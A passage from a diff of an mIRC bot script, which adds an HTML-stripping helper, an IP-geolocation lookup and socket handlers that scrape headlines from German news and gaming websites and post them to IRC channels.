+  if %tv.line == $calc($readn + 1) { inc %tv.line | goto start }
+  elseif ($gettok($remove($read(tv.txt,%tv.line),:),1,32) isnum) { inc %tva.line | goto start }
+  else { goto start }       
+  :end
+  write tvausgabe.txt
+  if ($control(%tv_chan,tv-chan)) { .timer 1 0 .mode %tv_chan +m | .timer 1 5 mode %tv_chan -m }
+  if ($control(%tv_chan,tv-chan)) { play %tv_chan tvausgabe.txt 1000 }
+  else { 
+    .timerp1 1 1 /mode %tv_chan +m
+    .timer 1 1 .msg %tv_chan $read(tvausgabe.txt,1) 
+    .timer 1 2 .msg %tv_chan $read(tvausgabe.txt,2)
+    .timer 1 3 .msg %tv_chan $read(tvausgabe.txt,3) 
+    .timer 1 4 .msg %tv_chan $read(tvausgabe.txt,4) 
+    .timerp2 1 6 /mode %tv_chan -m
+  }
+  .timer 1 20 .unset %tv*
+  .timer 1 20 .unset %x*
+  .timer 1 21 .unset %remhtm*
+  .timer 1 21 .unset %sende*
+  .timer 1 21 .unset %müll*
+}
+
+alias remhtml {
+  set %remhtm $1-
+  while ($pos(%remhtm,<,1)) {
+    if $pos(%remhtm,>,1) == $null { return %remhtm | halt }
+    elseif $left(%remhtm,1) != < { set %remhtm $mid(%remhtm,$calc($pos(%remhtm,>,1) + 1),$len(%remhtm)) }
+    elseif $mid(%remhtm,$pos(%remhtm,<,1),$calc(($pos(%remhtm,>,1) + 1) - $pos(%remhtm,<,1))) == $null { set %remhtm $mid(%remhtm,$calc($pos(%remhtm,>,1) + 1),$len(%remhtm)) }
+    set %x $mid(%remhtm,$pos(%remhtm,<,1),$calc(($pos(%remhtm,>,1) + 1) - $pos(%remhtm,<,1)))
+    %remhtm = $remove(%remhtm,%x,$chr(9))
+  }
+  return %remhtm
+}
+
+
+
+;------------------------------------------------------
+; IPLocate-Script 
+;------------------------------------------------------
+
+on *:sockopen:locate: { 
+  sockwrite -n locate GET /IpLocator.htm?GetLocation&ipaddress= $+ $hget(misc,$+(locate,.,ip)) HTTP/1.1 
+  sockwrite -n locate Host: www.geobytes.com $+ $str($+ $crlf,2)
+}
+on *:sockread:locate: {
+  sockread %locate
+  if ($regex(%locate,<p>We are currently unable to locate the address (.+))) { 
+    msg $hget(misc,$+(locate,.,channel)) $styles(IP-Locate) Traceroute for $hget(misc,$+(locate,.,ip)) failed. No information available.
+    sockclose locate
+  }
+  if (name="ipaddress" isin %locate) { hadd -m misc $+(locate,.,address) $gettok(%locate,8,34) }
+  if (ro-no_bots_pls13 isin %locate) { hadd -m misc $+(locate,.,country) $gettok(%locate,6,34) }
+  if (ro-no_bots_pls15 isin %locate) { hadd -m misc $+(locate,.,region) $gettok(%locate,6,34) }
+  if (ro-no_bots_pls17 isin %locate) { 
+    msg $hget(misc,$+(locate,.,channel)) $styles(IP-Locate) Traceroute for $hget(misc,$+(locate,.,address)) successfull. IP-Address is located in $hget(misc,$+(locate,.,country)) -> $hget(misc,$+(locate,.,region)) -> $gettok(%locate,6,34)
+    sockclose locate
+  }
+}
+
+;------------------------------------------------------
+; www.Heise.de
+;------------------------------------------------------
+
+on *:sockopen:heise:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: www.heise.de
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:heise:{
+  if ($sock($sockname)) {
+    sockread %heise.temp
+    if (<a href="/newsticker/meldung/ isin %heise.temp) {
+      sockclose $sockname
+      var %x = 1
+      while (%x <= $channels(0)) {
+        if ($news($channels(%x),heise)) {
+          if ($gettok($gettok(%heise.temp,$iif(/icons/ isin %heise.temp,4,3),62),1,60) != $hget($channels(%x),heise)) {         
+            hadd -m $channels(%x) heise $gettok($gettok(%heise.temp,$iif(/icons/ isin %heise.temp,4,3),62),1,60)
+            msg $channels(%x) —» (H)eise.de: $strip_tags($hget($channels(%x),heise)) — More Infos: www.Heise.de 
+          }
+        }
+        inc %x
+      }
+    }
+    unset %heise.*
+  }
+}
+
+;------------------------------------------------------
+; www.Counter-Strike.de
+;------------------------------------------------------
+
+on *:sockopen:cstrike:{
+  sockwrite -n $sockname GET / HTTP/1.1
+  sockwrite -n $sockname Host: www.counter-strike.de
+  sockwrite -n $sockname $crlf
+}
+
+on *:sockread:cstrike:{
+  if ($sock($sockname)) {
+    sockread %cstrike.temp
+    if (class="news"> isin %cstrike.temp) {
+      sockclose $sockname
+      var %x = 1
+      while (%x <= $channels(0)) {
+        if ($news($channels(%x),Counterstrike)) {
+          if ($gettok(%cstrike.temp,2,62) != $hget($channels(%x),cstrike)) {
+            hadd -m $channels(%x) cstrike $gettok(%cstrike.temp,2,62)
+            msg $channels(%x) —» (C)strike.de: $strip_tags($gettok(%cstrike.temp,2,62)) — More Infos: www.Counter-Strike.de 
+          }
+        }
+        inc %x
+      }
+      unset %cstrike.*
+    }
+  }
+}
+
+;------------------------------------------------------
+; www.starComa.de
+;------------------------------------------------------
+
+on *:sockopen:starcoma:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: www.starcoma.de
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:starcoma:{
+  if ($sock($sockname)) {
+    sockread %starcoma.temp
+    if (<td width="350"><font class="news4"> isin %starcoma.temp) {
+      sockclose $sockname
+      var %x = 1
+      while (%x <= $channels(0)) {
+        if ($news($channels(%x),starcoma)) {
+          var %j = $gettok($gettok(%starcoma.temp,3,62),1,40)
+          var %k = $hget($channels(%x),starcoma)
+          if (%j != %k) {
+            hadd -m $channels(%x) starcoma %j
+            msg $channels(%x) —» (s)tarComa.de: $strip_tags($gettok($gettok($gettok($gettok(%starcoma.temp,3,62),1,40),3,62),1,40)) - Kommentare: $iif($gettok($gettok(%starcoma.temp,4,62),1,60),$gettok($gettok(%starcoma.temp,4,62),1,60),0) — More Infos: www.starComa.de
+          }
+        }
+        inc %x 
+      }
+      unset %starcoma.*
+    }
+  }
+}
+
+;------------------------------------------------------
+; www.inHardware.de
+;------------------------------------------------------
+
+on *:sockopen:inhardware:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: hardware.ingame.de
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:inhardware:{
+  if ($sock($sockname)) {
+    sockread %inhardware.temp
+    if ($len(%inhardware.temp) <= 935) {
+      if (%inhardware.got.string) { 
+        sockclose $sockname
+        var %x = 1
+        while (%x <= $channels(0)) {
+          if ($news($channels(%x),hardware)) {
+            if (%inhardware.temp != $hget($channels(%x),inhardware)) {
+              hadd -m $channels(%x) inhardware %inhardware.temp
+              msg $channels(%x) —» (in)Hardware.de: $strip_tags(%inhardware.temp) — More Infos: www.inHardware.de 
+            }
+          }
+          inc %x        
+        }
+        unset %inhardware.*
+      }
+      if (<span style="font:bold 10pt Verdana, Arial, Helvetica, sans-serif; color:#ffffff; text-align:justify;"> isin %inhardware.temp) { set %inhardware.got.string 1 }
+    }
+  }
+}
+
+;------------------------------------------------------
+; www.inWoW.de
+;------------------------------------------------------
+
+on *:sockopen:inwow:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: wow.ingame.de
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:inwow:{
+  if ($sock($sockname)) {
+    sockread %inwow.temp
+    if ($len(%inwow.temp) <= 935) {
+      if (%inwow.got.string) {
+        sockclose $sockname
+        var %x = 1
+        while (%x <= $channels(0)) {
+          if ($news($channels(%x),wow)) {
+            if (%inwow.temp != $hget($channels(%x),inwow)) {
+              hadd -m $channels(%x) inwow %inwow.temp
+              msg $channels(%x) —» (in)WoW.de: $strip_tags(%inwow.temp) — More Infos: www.inWoW.de 
+            }
+          } 
+          inc %x
+        }
+      }
+      unset %inwow.*
+    }
+    if (<span style="font:bold 13px Verdana, Arial, Helvetica, sans-serif; color:#FFF8DF; text-align:justify;"> isin %inwow.temp) { set %inwow.got.string 1 }
+  }
+}
+
+;------------------------------------------------------
+; www.inWarCraft3.de
+;------------------------------------------------------
+
+on *:sockopen:inwarcraft3:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: warcraft3.ingame.de
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:inwarcraft3:{
+  if ($sock($sockname)) {
+    sockread %inwarcraft3.temp
+    if (<img src="/gfx/arrow.gif"><a style="font-size:8pt; isin %inwarcraft3.temp) {
+      sockclose $sockname
+      var %y = 1
+      while (%y <= $channels(0)) {
+        if ($news($channels(%y),warcraft)) {
+          if ($chr(33) !isin $gettok($gettok(%inwarcraft3.temp,3,62),1,40)) && ($gettok($gettok(%inwarcraft3.temp,3,62),1,40) != $hget($channels(%y),inwarcraft)) {
+            hadd -m $channels(%y) inwarcraft $gettok($gettok(%warcraft.temp,3,62),1,40)
+            msg $channels(%y) —» (in)WarCraft.de: $strip_tags($gettok($gettok(%inwarcraft3.temp,3,62),1,40)) - Kommentare: $iif($gettok($gettok(%warcraft.temp,1,41),2,40),$gettok($gettok(%warcraft.temp,1,41),2,40),0) — More Infos: www.WarCraft.de 
+          }
+        }  
+        inc %y
+      }
+      unset %inwarcraft3.*
+    }
+  }
+}
+
+;------------------------------------------------------
+; www.inSacred.de
+;------------------------------------------------------
+
+on *:sockopen:insacred:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: sacred.ingame.de
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:insacred:{
+  if ($sock($sockname)) {  
+    sockread %insacred.temp
+    if ($len(%insacred.temp) <= 935) {
+      if (%insacred.got.string) { 
+        sockclose $sockname
+        var %x = 1
+        while (%x <= $channels(0)) {
+          if ($news($channels(%x),sacred)) {
+            if (%insacred.temp != $hget($channels(%x),insacred)) {
+              hadd -m $channels(%x) insacred %insacred.temp
+              msg $channels(%x) —» (in)Sacred.de: $strip_tags(%insacred.temp) — More Infos: www.inSacred.de 
+            }
+          }
+          inc %x
+        }
+        unset %insacred.*
+      }
+      if (<span style="font:bold 13px Verdana, Arial, Helvetica, sans-serif; color:#EDDBC2; text-align:justify;"> isin %insacred.temp) { set %insacred.got.string 1 }
+    }
+  }
+}
+
+;------------------------------------------------------
+; www.inDiablo2.de
+;------------------------------------------------------
+
+on *:sockopen:indiablo2:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: diablo2.ingame.de
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:indiablo2:{
+  if ($sock($sockname)) {  
+    sockread %indiablo2.temp
+    if ($len(%indiablo2.temp) <= 935) {
+      if (%indiablo2.got.string) {
+        sockclose $sockname
+        var %x = 1
+        while (%x <= $channels(0)) {
+          if ($news($channels(%x),diablo)) {
+            if (%indiablo2.temp != $hget($channels(%x),indiablo2)) {
+              hadd -m $channels(%x) indiablo2 %indiablo2.temp
+              msg $channels(%x) —» (in)Diablo2.de: $strip_tags(%indiablo2.temp) — More Infos: www.inDiablo2.de 
+            }
+          }
+          inc %x 
+        }
+        unset %indiablo2.*
+      }
+      if (<span style="font:bold 10pt Verdana, Arial, Helvetica, sans-serif; color:#cbc1ab; text-align:justify;"> isin %indiablo2.temp) { set %indiablo2.got.string 1 }
+    }
+  }
+}
+
+;------------------------------------------------------
+; www.inUnreal.de
+;------------------------------------------------------
+
+on *:sockopen:inunreal:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: unreal.ingame.de
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:inunreal:{
+  if ($sock($sockname)) {
+    sockread %inunreal.temp
+    if ($len(%inunreal.temp) <= 935) {
+      if (%inunreal.got.string) {
+        sockclose $sockname 
+        var %x = 1
+        while (%x <= $channels(0)) {
+          if ($news($channels(%x),unreal)) {
+            if (%inunreal.temp != $hget($channels(%x),inunreal)) {
+              hadd -m $channels(%x) inunreal %inunreal.temp
+              msg $channels(%x) —» (in)Unreal.de: $strip_tags(%inunreal.temp) — More Infos: www.inUnreal.de 
+            }
+          }
+          inc %x
+        }
+        unset %inunreal.*
+      }
+      if (<span style="font-family: verdana, arial, helvetica; font-size: 13px; color: #E7E4E4; font-weight: bold"> isin %inunreal.temp) { set %inunreal.got.string 1 }
+    }
+  }
+}
+
+;------------------------------------------------------
+; www.inSims.de
+;------------------------------------------------------
+
+on *:sockopen:insims:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: sims.ingame.de
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:insims:{
+  if ($sock($sockname)) {
+    sockread %insims.temp
+    if ($len(%insims.temp) <= 935) {
+      if (%insims.got.string) { 
+        sockclose $sockname
+        var %x = 1
+        while (%x <= $channels(0)) {
+          if ($news($channels(%x),sims)) {
+            if (%insims.temp != $hget($channels(%x),insims)) {
+              hadd -m $channels(%x) insims %insims.temp
+              msg $channels(%x) —» (in)Sims.de: $strip_tags(%insims.temp) — More Infos: www.inSims.de
+            }
+          } 
+          inc %x
+        }
+        unset %insims.*
+      }
+      if (<span style="font:bold 10pt Verdana, Arial, Helvetica, sans-serif; color:#000000; text-align:justify;"> isin %insims.temp) { set %insims.got.string 1 }
+    }
+  }
+}
+
+;------------------------------------------------------
+; www.WinFuture.de
+;------------------------------------------------------
+
+on *:sockopen:winfuture:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: www.winfuture.de
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:winfuture:{
+  if ($sock($sockname)) {
+    sockread %winfuture.temp
+    if (class="news"> isin %winfuture.temp) {
+      sockclose $sockname
+      var %z = 1
+      while (%z <= $channels(0)) {
+        if ($news($channels(%z),winfuture)) {
+          var %new = $gettok($gettok(%winfuture.temp,4,62),1,60)
+          var %old = $hget($channels(%z),winfuture)
+          if (%new != %old) {
+            hadd -m $channels(%z) winfuture $gettok($gettok(%winfuture.temp,4,62),1,60)
+            msg $channels(%z) —» (W)inFuture.de: $strip_tags(%new) - Kommentare: $iif($gettok($gettok($gettok($gettok(%winfuture.temp,6,62),1,60),1,40),1,41),$gettok($gettok($gettok($gettok(%winfuture.temp,6,62),1,60),1,40),1,41),0) — More Infos: www.WinFuture.de 
+          }
+        }
+        inc %z
+      }
+      unset %winfuture.*
+    }
+  }
+}
+
+;------------------------------------------------------
+; www.Spiegel.de
+;------------------------------------------------------
+
+on *:sockopen:spiegel:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: www.spiegel.de
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:spiegel:{
+  if ($sock($sockname)) {
+    sockread %spiegel.temp
+    if (></a></td></tr></table></div><font size="1"><b isin %spiegel.temp) {
+      sockclose $sockname
+      var %x = 1
+      while (%x <= $channels(0)) {
+        if ($news($channels(%x),spiegel)) {
+          var %new = $gettok($gettok(%spiegel.temp,14,62),1,60) - $gettok($gettok(%spiegel.temp,21,62),1,60)
+          var %old = $hget($channels(%x),spiegel)
+          if (%new != %old) {
+            hadd -m $channels(%x) spiegel $gettok($gettok(%spiegel.temp,14,62),1,60) - $gettok($gettok(%spiegel.temp,21,62),1,60)
+            msg $channels(%x) —» (S)piegel.de: $strip_tags($hget($channels(%x),spiegel)) — More Infos: www.Spiegel.de
+          }
+        }
+        inc %x
+      }
+      unset %spiegel.*
+    }
+  }
+}
+
+;------------------------------------------------------
+; www.conceptt.com
+;------------------------------------------------------
+
+on *:sockopen:myct:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: www.conceptt.com
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:myct:{
+  if ($sock($sockname)) { 
+    sockread %myct.temp
+    if (</span> Letzte News:</b> isin %myct.temp) {
+      sockread %myct.news
+      sockclose $sockname
+      var %x = 1
+      while (%x <= $channels(0)) {
+        if ($news($channels(%x),conceptt)) {
+          if ($hget($channels(%x),conceptt) != $gettok($gettok(%myct.news,2,62),1,60)) {
+            hadd -m $channels(%x) conceptt $gettok($gettok(%myct.news,2,62),1,60)
+            msg $channels(%x) $styles(ConceptT.com:) $gettok($gettok(%myct.news,2,62),1,60) — More Infos: www.ConceptT.com
+          }
+        }
+        inc %x
+      }
+      unset %myct.*
+    }
+  }
+}
+
+;------------------------------------------------------
+; www.mypTx.de
+;------------------------------------------------------
+
+on *:sockopen:mypTx:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: www.mypTx.de
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:mypTx:{
+  if ($sock($sockname)) { 
+    sockread %mypTx.temp
+    if (<td id="topic"> isin %mypTx.temp) {
+      sockread %mypTx.news
+      sockclose $sockname
+      var %x = 1
+      while (%x <= $channels(0)) {
+        if ($news($channels(%x),mypTx)) {
+          if ($hget($channels(%x),mypTx) != $gettok(%mypTx.news,2,59)) {
+            hadd -m $channels(%x) mypTx $gettok(%mypTx.news,2,59)
+            msg $channels(%x) $styles(mypTx.de:) $gettok(%mypTx.news,2,59) — More Infos: www.mypTx.de
+          }
+        }
+        inc %x
+      }
+    }
+    unset %mypTx.*
+  }
+}
+
+;------------------------------------------------------
+; www.extreme-players.de
+;------------------------------------------------------
+
+on *:sockopen:extreme:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: www.extreme-players.de
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:extreme:{
+  if ($sock($sockname)) { 
+    sockread %extreme.temp
+    if (class="news_head_l"> isin %extreme.temp) {
+      sockclose $sockname
+      var %x = 1
+      while (%x <= $channels(0)) {
+        if ($news($channels(%x),extreme)) {
+          if ($hget($channels(%x),extreme) != $gettok($gettok(%extreme.temp,3,62),1,60)) {
+            hadd -m $channels(%x) extreme $gettok($gettok(%extreme.temp,3,62),1,60)
+            msg $channels(%x) $styles(eXtreme-plaYers.de:) $gettok($gettok(%extreme.temp,3,62),1,60) — More Infos: www.eXtreme-plaYers.de
+          }
+        }
+        inc %x
+      }
+    }
+    unset %extreme.*
+  }
+}
+
+;------------------------------------------------------
+; www.mousesports.com
+;------------------------------------------------------
+
+on *:sockopen:mouse:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: www.mousesports.com
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:mouse:{
+  if ($sock($sockname)) { 
+    sockread %mouse.temp
+    if (alt=""></font> isin %mouse.temp) {
+      sockclose $sockname
+      var %x = 1
+      while (%x <= $channels(0)) {
+        if ($news($channels(%x),mouse)) {
+          if ($hget($channels(%x),mouse) != $gettok($gettok(%mouse.temp,7,62),1,60)) {
+            hadd -m $channels(%x) mouse $gettok($gettok(%mouse.temp,7,62),1,60)
+            msg $channels(%x) $styles(MouseSports.com:) $gettok($gettok(%mouse.temp,7,62),1,60) — More Infos: www.MouseSports.com
+          }
+        }
+        inc %x
+      }
+    }
+    unset %mouse.*
+  }
+}
+
+
+;------------------------------------------------------
+; www.quakenet.org
+;------------------------------------------------------
+
+on *:sockopen:quakenet:{
+  if ($sock($sockname)) {
+    sockwrite -n $sockname GET / HTTP/1.1
+    sockwrite -n $sockname Host: www.quakenet.org
+    sockwrite -n $sockname $crlf
+  }
+}
+on *:sockread:quakenet:{
+  if ($sock($sockname)) { 
+    sockread %quakenet.temp
+    if (<td><font id="headline"><font size="+1"> isin %quakenet.temp) {
+      sockclose $sockname
+      var %x = 1
+      while (%x <= $channels(0)) {
+        if ($news($channels(%x),quakenet)) {
+          if ($hget($channels(%x),quakenet) != $gettok($gettok(%quakenet.temp,4,62),1,60)) {
+            hadd -m $channels(%x) quakenet $gettok($gettok(%quakenet.temp,4,62),1,60)
+            msg $channels(%x) $styles(Quakenet.org:) $gettok($gettok(%quakenet.temp,4,62),1,60) — More Infos: www.QuakeNet.org
+          }
+        }
+        inc %x
+      }
+    }
+    unset %quakenet.*
+  }
+}
